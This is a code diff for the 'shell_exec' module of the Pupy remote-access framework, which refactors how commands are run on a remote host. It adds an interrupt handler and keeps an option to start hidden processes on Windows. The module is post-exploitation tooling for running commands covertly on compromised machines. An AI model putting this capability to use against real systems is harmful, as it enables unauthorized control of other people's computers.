@@ -4,7 +4,6 @@
 from pupylib.PupyModule import *
 import subprocess
 from rpyc.utils.helpers import restricted
-from modules.lib.utils.shell_exec import shell_exec
 from argparse import REMAINDER
 
 __class_name__="ShellExec"
@@ -13,11 +12,19 @@ __class_name__="ShellExec"
 class ShellExec(PupyModule):
     """ execute shell commands on a remote system """
 
+    dependencies = {
+        'all': [ 'pupyutils.safepopen' ],
+        'windows': [ 'pupwinutils.processes' ]
+    }
+
+    terminate = None
+    interrupted = False
+
     @classmethod
     def init_argparse(cls):
         cls.arg_parser = PupyArgumentParser(prog='shell_exec', description=cls.__doc__)
-        cls.arg_parser.add_argument('-s', '--shell', help="default to /bin/sh on linux or cmd.exe on windows")
-        cls.arg_parser.add_argument('-H', '--hide', action='store_true', help='launch process on background (only for windows)')
+        cls.arg_parser.add_argument('-S', '--no-shell', action='store_true', help='Do not execute command in shell')
+        cls.arg_parser.add_argument('-H', '--hide', action='store_true', help='Launch process on background (only for windows)')
         cls.arg_parser.add_argument('-c', '--codepage', default=None, help='decode using codepage')
         cls.arg_parser.add_argument(
             'argument',
@@ -26,14 +33,49 @@ class ShellExec(PupyModule):
 
     def run(self, args):
         if not args.hide:
-            self.log(shell_exec(self.client, args.argument, shell=args.shell, encoding=args.codepage))
+            check_output = self.client.remote('pupyutils.safepopen', 'check_output', False)
+
+            cmdline = tuple(args.argument)
+            if not args.no_shell:
+                cmdline = ' '.join(cmdline)
+
+            try:
+                self.terminate, get_data = check_output(
+                    cmdline, shell=not args.no_shell, encoding=args.codepage)
+            except Exception, e:
+                self.error(' '.join(x for x in e.args if type(x) in (str, unicode)))
+                return
+
+            data, code = get_data()
+            data = data.strip()
+            if not data and self.interrupted:
+                return
+
+            if code:
+                if data:
+                    self.log(data)
+                self.error('Error code: {}'.format(code))
+            else:
+                if not data:
+                    data = '[ NO OUTPUT ]'
+                self.log(data)
+
         elif args.hide and self.client.is_windows():
             try:
-                self.client.load_package("pupwinutils.processes")
-                p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.argument)
-                pid=p.pid
+                start_hidden_process = self.client.remote('pupwinutils.processes', 'start_hidden_process', False)
+                p = start_hidden_process(args.argument)
+                pid = p.pid
                 self.success("Process created with pid %s" % p.pid)
+
             except Exception, e:
                 self.error("Error creating the process: %s" % e)
         else:
             self.error('--hide option works only for Windows hosts')
+
+    def interrupt(self):
+        if self.interrupted:
+            return
+
+        if self.terminate:
+            self.interrupted = True
+            self.terminate()
